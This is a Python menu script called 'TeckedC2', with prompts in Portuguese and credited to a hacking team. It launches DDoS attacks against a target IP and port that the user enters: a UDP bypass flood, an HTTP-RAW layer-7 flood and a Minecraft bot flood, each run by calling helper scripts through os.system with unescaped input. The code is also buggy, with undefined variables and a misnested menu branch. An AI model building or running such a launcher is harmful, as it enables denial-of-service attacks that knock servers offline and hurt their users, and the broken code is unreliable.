import os
try:
    import colorama
except ModuleNotFoundError:
    os.system('pip install colorama')
from colorama import Fore
try:
    import pyfiglet
except ModuleNotFoundError:
    os.system('pip install pyfiglet')
import time
os.system("clear")

lista_numeros = ["1" , "2" , "3" , "4" , "5"]

while True:
	os.system("clear")
	os.system("pyfiglet --color=BLUE TeckedC2")
	print(Fore.BLUE + "[01] Ataque ddos l4")
	print(Fore.BLUE + "[02] Ataque ddos l7")
	print(Fore.BLUE + "[03] Ataque mcbot 0.14.3")
	print(Fore.BLUE + "[04] Verificar ping de servidor bedrock")
	print("")
	print("[05] Sobre TeckedC2")
	print("")
	
	player = input(Fore.BLUE + "Escolha uma dessas opções: ")
	
	if player == '4':
		os.system("clear")
		os.system("pyfiglet --color=BLUE TeckedC2")
		player_4_ip = input(Fore.BLUE + "Endereço: ")
		player_4_port = input(Fore.BLUE + "Portal: ")
		time.sleep(1)
		os.system("clear")
		os.system("pyfiglet --color=BLUE TeckedC2")
		os.system(f"python ping-mcpe.py {player_4_ip} -p {player_4_port}")
		
	if player == '3':
		os.system("clear")
		os.system("pyfiglet --color=BLUE TeckedC2")
		player_3_ip = input(Fore.BLUE + "Endereço: ")
		player_3_port = input(Fore.BLUE + "Portal: ")
		player_3_bots = input(Fore.BLUE + "Quatindade de bots: ")
		time.sleep(1)
		os.system("clear")
		os.system("pyfiglet --color=BLUE TeckedC2")
		print(Fore.BLUE + f"Ataque mcbot: {player_4_ip_} {player_4_port}")
		os.system(f"python mcbot.py {player_3_ip} {player_3_port} {player_3_bots}")
	
	if player == '2':
		os.system("clear")
		os.system("pyfiglet --color=BLUE TeckedC2")
		player_2_http = input(Fore.BLUE + "Site: ")
		player_2_http = input(Fore.BLUE + "Portal: ")
		time.sleep(1)
		os.system("clear")
		os.system("pyfiglet --color=BLUE TeckedC2")
		print(ForeBLUE + f"Ataque ddos: {player_2_http}")
		os.system(f"python http.py {player_2_http} {player_2_port} [HTTP-RAW]")
		
	if player == '1':
		os.system("clear")
		os.system("pyfiglet --color=BLUE TeckedC2")
		player_1_ip = input(Fore.BLUE + "Endereço: ")
		player_1_port = input(Fore.BLUE + "Portal: ")
		time.sleep(1)
		os.system("pyfiglet --color=BLUE TeckedC2")
		print(f"Ataque ddos: {player_1_ip} {player_1_port} [UDP-BYPASS]")
		os.system(f"python udpbypass.py {player_1_ip} {player_1_port} y 300 1024")
		
		if player == '5':
			os.system("clear")
			time.sleep(5)
			print("Olá! Essa programação foi criada por mim, @XXXP3DRO_MCPE. Essa ferramenta foi desenvolvida para o time de hackers chamado TeamTECKED.")
			print("")
			print("Em breve terá mais metedos!")
			print("")
			print("TeckedC2 [V1]")